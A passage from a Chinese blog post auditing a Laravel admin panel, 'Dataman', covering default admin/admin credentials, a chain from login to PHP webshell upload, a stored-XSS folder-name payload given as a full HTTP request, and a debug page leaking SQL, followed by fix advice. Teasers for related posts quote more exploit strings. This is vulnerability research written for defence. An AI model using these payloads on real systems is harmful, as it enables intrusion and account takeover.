+<h2 id="六、默认口令：安装器自己把密码告诉你了"><a href="#六、默认口令：安装器自己把密码告诉你了" class="headerlink" title="六、默认口令：安装器自己把密码告诉你了"></a>六、默认口令：安装器自己把密码告诉你了</h2><p>Dataman 的安装命令在结束时打印这么一行：</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// app/Console/Commands/Install.php:60-62</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">call</span>(<span class="string">'db:seed'</span>, [<span class="string">'--class'</span> =&gt; <span class="string">'DatabaseSeeder'</span>]);</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">info</span>(<span class="string">'安装完成！'</span>);</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">warn</span>(<span class="string">'用户名密码都为：admin'</span>);</span><br></pre></td></tr></tbody></table></figure>
+<p>对应的账号硬编码在安装 SQL 里：</p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT INTO</span> `admin_users` <span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="string">'admin'</span>, <span class="string">'$2y$10$NnBZzPbapsOTVShsF2ROQ.wpPNxWJn9E5/UjVWeE3APdmzXUgqgpu'</span>, ...);</span><br></pre></td></tr></tbody></table></figure>
+<p>这个 bcrypt 哈希对应的明文就是 <code>admin</code>。</p>
+<p>这里有个用词要较真。这类问题常被笼统地叫成「弱口令」，但不够准确。问题不在于口令强度低，<code>admin</code> 也不算弱到能被字典秒破的程度。真正的问题是它<strong>是安装器内置的、且没有人要求你改</strong>。只要部署方照着文档走完流程就上线，这个口令就会一直有效。准确的叫法是<strong>默认口令</strong>。</p>
+<p>再看登录页，字段只有三个：</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/attachments/figDM1_登录入口无验证码.png" alt="图一　登录表单没有验证码"></p>
+<p>账号、密码、记住我。没有验证码，<code>config/admin.php</code> 里也没有登录失败次数限制或锁定策略。也就是说这个默认口令可以无限次尝试，而且试对了不会有任何提示。</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/attachments/figDM2_默认口令进入后台.png" alt="图二　用默认口令进入后台"></p>
+<p>到这里，前面那个需要管理员权限的上传接口就解锁了。整条攻击链闭合：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">读 README 知道默认口令是 admin/admin</span><br><span class="line">  → 登录后台，拿到会话</span><br><span class="line">  → 往媒体库上传一个 PHP 文件</span><br><span class="line">  → 访问 /storage/poc_shell.php 执行命令</span><br></pre></td></tr></tbody></table></figure>
+<p>四步，不需要任何已有账号，不需要猜密码。</p>
+<h2 id="七、存储型-XSS：一行原样输出"><a href="#七、存储型-XSS：一行原样输出" class="headerlink" title="七、存储型 XSS：一行原样输出"></a>七、存储型 XSS：一行原样输出</h2><p>后台的媒体列表页有这么一行：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">{{-- resources/views/media/index.blade.php:332 --}}</span><br><span class="line">{!! $item['preview'] !!}</span><br></pre></td></tr></tbody></table></figure>
+<p>Blade 模板里 <code>{{ }}</code> 会转义，<code>{!! !!}</code> 不会。而 <code>preview</code> 这个字段是拼出来的，媒体服务在生成目录预览时，把目录名直接插进了 <code>href</code> 属性：</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// app/Services/MediaService.php:163-184</span></span><br><span class="line"><span class="variable">$url</span> = <span class="title function_ invoke__">route</span>(<span class="string">'dcat.admin.media.index'</span>, [<span class="string">'path'</span> =&gt; <span class="string">'__path__'</span>, <span class="string">'view'</span> =&gt; <span class="title function_ invoke__">request</span>(<span class="string">'view'</span>)]);</span><br><span class="line"><span class="variable">$preview</span> = <span class="string">"&lt;a href=\"<span class="subst">$url</span>\"&gt;&lt;span class=\"file-icon text-aqua\"&gt;&lt;i class=\"fa fa-folder\"&gt;&lt;/i&gt;&lt;/span&gt;&lt;/a&gt;"</span>;</span><br><span class="line"><span class="variable">$dirs</span> = <span class="title function_ invoke__">array_map</span>(function (<span class="variable">$dir</span>) <span class="keyword">use</span> ($<span class="title">preview</span>) {</span><br><span class="line">    <span class="title">return</span> [</span><br><span class="line">        '<span class="title">preview</span>' =&gt; <span class="title">str_replace</span>('<span class="title">__path__</span>', $<span class="title">dir</span>, $<span class="title">preview</span>),</span><br><span class="line">    ];</span><br><span class="line">}, <span class="variable">$dirs</span>);</span><br></pre></td></tr></tbody></table></figure>
+<p><code>str_replace</code> 的第三个 <code>$dir</code> 是原始目录名，没有经过 <code>htmlspecialchars</code>。而目录名是由新建目录接口的 <code>name</code> 参数决定的，同样没有字符过滤。</p>
+<p>于是新建一个名字里带引号和标签的目录：</p>
+<figure class="highlight http"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/media/folder</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">X-CSRF-TOKEN</span><span class="punctuation">: </span>&lt;会话 token&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-routeros"><span class="attribute">_token</span>=&lt;token&gt;&amp;dir=/&amp;name=xss"&gt;&lt;img <span class="attribute">src</span>=x <span class="attribute">onerror</span>=<span class="string">"document.body.innerHTML='&lt;h1 style=color:red&gt;XSS 已执行'"</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+<p>再刷新媒体列表页，注入的 <code>onerror</code> 就执行了。</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/attachments/figDM5_存储型XSS.png" alt="图五　注入的脚本在管理员浏览器里执行"></p>
+<p>这个漏洞有个精确的验证方法。同一个 payload 在页面上会出现七八次，但绝大多数走的是 Blade 的 <code>{{ }}</code>：</p>
+<figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">value="xss<span class="symbol">&amp;quot;</span><span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>img src=x onerror=alert(document.domain)<span class="symbol">&amp;gt;</span>"</span><br></pre></td></tr></tbody></table></figure>
+<p>被转义成实体，不可执行。只有 <code>{!! !!}</code> 那一处是字面的：</p>
+<figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://127.0.0.1:18080/media?path=xss"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">...</span></span></span><br></pre></td></tr></tbody></table></figure>
+<p>统计一下两类标签的数量，字面的一处、实体的六处。这个对比把漏洞点精确定位到了 <code>media/index.blade.php</code> 的第三百三十二行，不用通读整个模板。</p>
+<p>搭环境的时候还碰到一个细节，一起记下来：<strong>payload 里不能出现 <code>/</code>。</strong> 目录名会被当路径处理，我最初用的 payload 里带了 <code>&lt;/h1&gt;</code>，那个斜杠被当成路径分隔符，目录名在 <code>&lt;</code> 处就被截断了，前端怎么调都不触发。改成不闭合的标签（浏览器会自动补全）才存得进去。</p>
+<h2 id="八、未授权接口泄漏-SQL-语句与调用栈"><a href="#八、未授权接口泄漏-SQL-语句与调用栈" class="headerlink" title="八、未授权接口泄漏 SQL 语句与调用栈"></a>八、未授权接口泄漏 SQL 语句与调用栈</h2><p>回到开头那两个没有鉴权的接口。</p>
+<p>Laravel 的调试模式由 <code>.env</code> 里的 <code>APP_DEBUG</code> 控制，而 Dataman 的 <code>.env.example</code> 把它默认打开了：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># .env.example:11-14</span><br><span class="line"># 是否开启 DEBUG 模式</span><br><span class="line"># 开启后如果程序出错，将会抛出异常</span><br><span class="line"># 关闭后如果程序出错，将只会给出 HTTP 错误码 500</span><br><span class="line">APP_DEBUG=true</span><br></pre></td></tr></tbody></table></figure>
+<p>同时 <code>APP_KEY</code> 在示例文件里是空的（要跑 <code>key:generate</code> 才生成）。部署方照着流程走，很容易连着调试开关一起沿用下来。</p>
+<p>单独一个调试开关还不算漏洞，得有个能触发异常的地方。这里是第二个问题：数据库 schema 与代码不同步。</p>
+<p><code>app/Services/ChannelService.php:46</code> 里这么查：</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$data</span> = <span class="title class_">Channel</span>::<span class="title function_ invoke__">where</span>([<span class="string">'parent_id'</span> =&gt; <span class="variable">$channel_id</span>, <span class="string">'status'</span> =&gt; <span class="number">1</span>])</span><br><span class="line">    -&gt;<span class="title function_ invoke__">get</span>()-&gt;<span class="title function_ invoke__">toArray</span>();</span><br></pre></td></tr></tbody></table></figure>
+<p>但 <code>channel</code> 表实际只有这些列：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id, parent_id, platform_id, name, title, image, order, created_at, updated_at</span><br></pre></td></tr></tbody></table></figure>
+<p>没有 <code>status</code>。查询必然抛 <code>QueryException</code>，而请求是未授权的，异常页在调试模式下被完整渲染出来：</p>
+<figure class="highlight http"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/v1/layouts?app_id=demo_app_001&amp;channel_name=home</span> <span class="meta">HTTP/1.1</span></span><br></pre></td></tr></tbody></table></figure>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/attachments/figDM6_未授权泄漏SQL.png" alt="图六　未授权请求返回的异常页"></p>
+<p>响应 500，618 KB。里面直接印着完整 SQL、框架版本、源码绝对路径和三十九帧调用栈：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Illuminate\Database\QueryException: SQLSTATE[42S22]: Column not found: 1054</span><br><span class="line">Unknown column 'status' in 'where clause'</span><br><span class="line">(SQL: select * from `channel` where (`parent_id` = 1 and `status` = 1))</span><br><span class="line">in file /var/www/html/vendor/laravel/framework/src/Illuminate/Database/Connection.php on line 712</span><br></pre></td></tr></tbody></table></figure>
+<p>这个组合挺典型：<strong>调试开关本身只是配置疏忽，但它需要一个异常才能变现，而异常往往来自另一个疏忽。</strong> 两个小问题叠起来，就是一个不需要凭据、能直接读出数据库结构的入口。单次响应 618 KB 也算一种放大型的拒绝服务。</p>
+<h2 id="九、还有两个设计问题"><a href="#九、还有两个设计问题" class="headerlink" title="九、还有两个设计问题"></a>九、还有两个设计问题</h2><p>审计里还看到两处不算漏洞、但值得写下来的东西。</p>
+<p>一处是平台信息的缓存永不过期。<code>PlatformService</code> 的构造函数用一个锁控制全量刷新：</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="variable">$lock_key</span> = <span class="string">'dmp:pf:app_id:lock'</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title class_">Cache</span>::<span class="title function_ invoke__">has</span>(<span class="variable">$lock_key</span>)) {</span><br><span class="line">        <span class="variable">$items</span> = <span class="title class_">Platform</span>::<span class="title function_ invoke__">where</span>([<span class="string">'status'</span> =&gt; <span class="number">1</span>])-&gt;<span class="title function_ invoke__">get</span>([...])-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$items</span> <span class="keyword">as</span> <span class="variable">$item</span>) {</span><br><span class="line">            <span class="title class_">Cache</span>::<span class="title function_ invoke__">put</span>(<span class="string">"dmp:pf:app_id:<span class="subst">{$item['app_id']}</span>"</span>, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$item</span>));</span><br><span class="line">        }</span><br><span class="line">        <span class="title class_">Cache</span>::<span class="title function_ invoke__">put</span>(<span class="variable">$lock_key</span>, <span class="literal">true</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p>锁一旦写入就不再失效，代码里也没有任何在平台保存时清除它的地方。表现就是：后台新增一个平台，接口侧查不到，必须手动跑 <code>php artisan cache:clear</code> 才生效。反过来，删掉的平台在缓存有效期内还会继续对外服务。</p>
+<p>另一处是操作审计日志默认关闭。项目带了 <code>operation-log</code> 扩展，中间件也写好了，但数据库里它的启用状态是 0，另有一份应用级的 <code>LogOperation</code> 中间件在全项目搜不到注册点。实测 <code>admin_operation_log</code> 表记录数为零，后台的所有操作都没有留痕。</p>
+<p>这两条本身不构成漏洞，但会放大前面那些漏洞的后果。上传了 webshell 却没有审计记录，事后溯源就少了最直接的一条线索。</p>
+<h2 id="十、这次审计的几点归纳"><a href="#十、这次审计的几点归纳" class="headerlink" title="十、这次审计的几点归纳"></a>十、这次审计的几点归纳</h2><p>把过程回过头看，有几个判断在下次能直接用上。</p>
+<p>汇点扫描干净不等于没洞。框架把 SQL、文件、命令这些危险操作都封装了，扫描能排除掉一类问题，但真正的高频漏洞已经迁到逻辑层去了。扫完要换个方向，去看权限、文件类型、模板转义和配置项。</p>
+<p>找攻击面的高效问法是「用户输入最后去了哪」。把所有从请求取值的地方列出来逐个往后追，通常能很快收窄到一两个文件。Dataman 一百五十个文件，最终六个漏洞里四个出在同一个控制器。</p>
+<p>路径穿越的层级要数出来，不要心算。少一级的结果是 404，看起来和没有漏洞完全一样。</p>
+<p>判定文件上传能不能导致命令执行，必须看三个条件：落在哪个目录、这个目录能不能从 Web 访问、Web 服务器会不会执行它。「不校验扩展名」只是第一步。</p>
+<p>术语要较真。「默认口令」说的是安装器内置且没人要求改，「弱口令」说的是强度低，是两回事，定级和修复方向都不同。</p>
+<h2 id="十一、修复建议"><a href="#十一、修复建议" class="headerlink" title="十一、修复建议"></a>十一、修复建议</h2><p>按优先级排：</p>
+<p>上传是首要的。加扩展名与 MIME 双重白名单，丢弃原始文件名改用随机名，并且把上传目录移出 Web 根目录。如果架构上改不了，至少在 nginx 里禁掉该目录的脚本解析：</p>
+<figure class="highlight nginx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">location</span><span class="regexp"> ^~</span> /storage/ {</span><br><span class="line">    <span class="section">location</span> <span class="regexp">~ \.php$</span> { <span class="attribute">deny</span> all; }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p>默认口令其次。安装器不再写死账号，改成安装时强制设置，并加验证码与登录失败锁定。</p>
+<p>文件读取给 <code>file</code> 参数做 <code>realpath()</code> 归一化，校验结果落在存储根目录之内，拒绝含 <code>..</code> 的输入。更彻底的做法是改用文件 ID 索引寻址。</p>
+<p>调试开关在生产环境必须关掉，<code>.env.example</code> 里的默认值也应该改成 <code>false</code>。同时补齐 <code>channel</code> 表缺失的列，让 schema 和代码对上。</p>
+<p>XSS 那一处，把 <code>preview</code> 改成只含图标和链接 ID 的结构化数据，交给 Blade 正常转义。确需输出 HTML 时，对拼接进去的文件名和目录名统一做 <code>e()</code>。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://moxin1044.github.io">末心</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://moxin1044.github.io/posts/a1b2/">https://moxin1044.github.io/posts/a1b2/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://moxin1044.github.io" target="_blank">末心的小博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a><a class="post-meta__tags" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a><a class="post-meta__tags" href="/tags/Laravel/">Laravel</a><a class="post-meta__tags" href="/tags/Dcat-Admin/">Dcat-Admin</a><a class="post-meta__tags" href="/tags/%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A/">路径穿越</a><a class="post-meta__tags" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a></div><div class="post-share"><div class="social-share" data-image="/attachments/figDM4_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.png" data-sites="wechat,weibo,qq,facebook,x"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/posts/4c9e/" title="异步环境下的条件竞争：为什么单线程的协程也会有并发问题"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/attachments/figA1_await%E6%98%AF%E6%8A%A2%E5%8D%A0%E7%82%B9.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">异步环境下的条件竞争：为什么单线程的协程也会有并发问题</div></div><div class="info-2"><div class="info-item-1">先看一段代码。 123async def worker():    if counter is None:        counter = await load_counter() 这是异步项目里到处都是的写法：如果还没加载过，就加载一次。逻辑上无懈可击：先检查，再使用，顺序清楚。在没有并发的世界里，这段代码是正确的。 但把它放进事件循环，跑 16 个并发请求，实测结果是： 16 个请求全都执行了一遍 load_counter()。 不是偶尔，是每一轮。我把这个场景跑了 100 轮，0 轮出现「只加载一次」的期望行为。 这就是异步环境下的条件竞争。它和线程模型里的竞争有相同的内核（检查与使用之间被撕开），但产生方式完全不同：这里没有抢占式调度，没有多核，只有一个线程。真正的竞争者是同一线程里的另一个协程，趁你 await 的时候插了进来。 一、一个反直觉的事实：单线程也会有竞争asyncio 是单线程的。事件循环跑在一个线程里，所有协程都在这个线程上执行。既然只有一条执行流，为什么两个协程会互相干扰？ 答案在 await。 把「有没有 await」做成唯一变量，看两个任务的执行...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/posts/d5a3/" title="【漏洞分析】74CMS-骑士CMSV5.0.1后台远程代码执行漏洞分析"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../attachments/image-20251118110503633.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-18</div><div class="info-item-2">【漏洞分析】74CMS-骑士CMSV5.0.1后台远程代码执行漏洞分析</div></div><div class="info-2"><div class="info-item-1">前言复现CMS：74CMS（骑士CMS） 复现版本：V5.0.1  漏洞点版本验证 网站后台底部拥有版本号 漏洞复现 1http://192.168.121.130/.',phpinfo(),'/.com  随后刷新界面即可看到phpinfo()信息  漏洞分析由于CMS版本较老，先复现了一下已公开的漏洞。根据请求反查找到： 123456789101112131415161718192021222324public function edit(){        if(IS_POST){            $site_domain = I('request.site_domain','','trim');            $site_domain = trim($site_domain,'/');            $site_dir = I('request.site_dir',C('qscms_site_dir&amp;#...</div></div></div></a><a class="pagination-related" href="/posts/8397/" title="【漏洞分析】DEDECMS-V5.7SP2-5.7.107-后台RCE漏洞"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../attachments/image-20251118124213360.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-18</div><div class="info-item-2">【漏洞分析】DEDECMS-V5.7SP2-5.7.107-后台RCE漏洞</div></div><div class="info-2"><div class="info-item-1">前言复现CMS：DeDeCMS 复现版本：V5.7-SP2 漏洞点1 模块-&gt;文件管理器 DeDeCMS的文件管理器功能，支持文件上传  上传一个info.php  成功获取FLAG 漏洞点2 广告管理 添加后，查看调用代码  访问JS代码中给出的路径  那么如果是输出FLAG呢？   漏洞点3 后台任意代码执行 CVE-2018-7700 1/tag_test_action.php?url=a&amp;token=&amp;partcode={dede:field name='source' runphp='yes'}phpinfo();{/dede:field} 漏洞点4 sys_cache_up.php后台文件写入漏洞代码在/dede/sys_cache_up.php文件 36行处，由于可以操作文件内容，且文件内容是从数据库取值的，因此通过在数据库里写入内容，通过查询数据库将文件写入服务器。 使用下面请求将代码写入数据库： 1/dede/stepselect_main.php?action...</div></div></div></a><a class="pagination-related" href="/posts/e8b8/" title="【漏洞分析】GetSimple-CMS-远程命令执行（CVE-2019-11231）"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../attachments/image-20251118142129310.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-18</div><div class="info-item-2">【漏洞分析】GetSimple-CMS-远程命令执行（CVE-2019-11231）</div></div><div class="info-2"><div class="info-item-1">前言复现CMS：GetSimple CMS 复现版本：3.3.15 漏洞点1 xml信息泄露 访问：/data/users/admin.xml，可获得用户名、Hash后的密码、邮箱等信息。  题目仅给出了后台地址 hash的密码我们去解密一下  进入后台地址：http://challenge.qsnctf.com:35595/admin/  编辑主题  执行完phpinfo即退出  访问：http://challenge.qsnctf.com:35595/theme/Innovation/template.php  但是很遗憾没有发现FLAG  还是回去改一下一句话木马，这个环境需要提权一下 1find / -perm -u=s -type f 2&gt;/dev/null   使用find提权，读取/proc/1/environ拿到FALG </div></div></div></a><a class="pagination-related" href="/posts/d051/" title="【漏洞分析】SeaCMS_海洋CMS_V11 - 12.5后台代码执行漏洞"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../attachments/image-20251117101944835.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-17</div><div class="info-item-2">【漏洞分析】SeaCMS_海洋CMS_V11 - 12.5后台代码执行漏洞</div></div><div class="info-2"><div class="info-item-1">前言复现CMS：SeaCMS（海洋CMS） 复现版本：V11 地址：https://github.com/seacms-net/CMS/releases/tag/V11  根据代码相关内容，发现新版本理论（代码一致，尚未复现）仍然存在该漏洞。  漏洞点 admin_ip.php经过代码审计发现，POST参数v及ip均未使用任何过滤    也就是可以通过双引号闭合，配合php代码进行代码执行。 漏洞点 admin_notify.php  其实原理一致，都是没有进行过滤等操作 附赠一个本地文件包含 1234567891011121314151617GET /0mrht1/admin_safe.php?action=download&amp;file=C:/windows/system.ini HTTP/1.1Host: localhostSec-Fetch-Site: noneAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,...</div></div></div></a><a class="pagination-related" href="/posts/b51c/" title="【漏洞复现】CVE-2010-1870-S2-005 远程代码执行漏洞"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/lolia-cover.svg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-04-05</div><div class="info-item-2">【漏洞复现】CVE-2010-1870-S2-005 远程代码执行漏洞</div></div><div class="info-2"><div class="info-item-1">题目环境Dockerfile123456789101112131415161718192021FROM tomcat:8.5-jre8RUN apt-get update &amp;&amp; apt-get install -y curl netcat &amp;&amp; rm -rf /var/lib/apt/lists/*COPY S2-005.war /usr/local/tomcat/webapps/ROOT.warRUN echo '#!/bin/bash\n\if [ -n "$FLAG" ]; then\n\    echo "$FLAG" &gt; /flag\n\    chmod 444 /flag\n\    echo "[+] Flag written to /flag"\n\else\n\    echo "[-] FLAG environment variable is empty!" &gt; /flag\n\fi\n\exec catalina.sh ru...</div></div></div></a><a class="pagination-related" href="/posts/b004/" title="【漏洞复现】CVE-2026-60004 Gitea diffpatch 接口 Git 钩子注入致远程命令执行"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../attachments/image-20261014040001333.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-10-14</div><div class="info-item-2">【漏洞复现】CVE-2026-60004 Gitea diffpatch 接口 Git 钩子注入致远程命令执行</div></div><div class="info-2"><div class="info-item-1">前言Gitea 在 1.17 ~ 1.27.0 版本中存在一个严重的代码注入漏洞（CVE-2026-60004，GHSA-rcr6-4jqh-j84m），官方已在 1.27.1 修复。漏洞位于 diffpatch（差异补丁）API：攻击者只需拥有一个账号并对任意仓库具备写权限，即可通过该接口提交恶意补丁，在服务器以 裸仓库（bare repo） 形式存储的临时仓库中 植入并执行 Git 钩子，从而以 Gitea 服务账户权限执行任意命令。 由于 Gitea 默认 开放注册，外部人员可以自行注册账号并创建仓库，从「无任何权限」直接获得仓库写权限，使该漏洞极易被真实利用（CVSS 9.8）。 漏洞信息 漏洞编号：CVE-2026-60004（GHSA-rcr6-4jqh-j84m） 影响版本：Gitea 1.17 ~ 1.27.0 修复版本：1.27.1 漏洞位置：POST /api/v1/repos/{owner}/{repo}/diffpatch 利用前提：拥有账号 + 对目标仓库具备写权限（默认开放注册时，攻击者可自行注册并创建仓库，天然满足） 危害：任意命令执行（以 Gite...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://q1.qlogo.cn/g?b=qq&amp;nk=1044631097&amp;s=640" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="author-info-name">末心</div><div class="author-info-description">一个关于技术的小站，分享自己的技术思考和经验。</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">93</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">104</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">42</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Moxin1044"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Moxin1044" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:moxin1044@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title="RSS"><i class="fas fa-rss" style="color: #f26522;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">学而不思则罔，思而不学则殆</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%85%88%E6%91%B8%E6%B8%85%E6%94%BB%E5%87%BB%E9%9D%A2"><span class="toc-number">1.</span> <span class="toc-text">一、先摸清攻击面</span></a></li><li class="toc-item 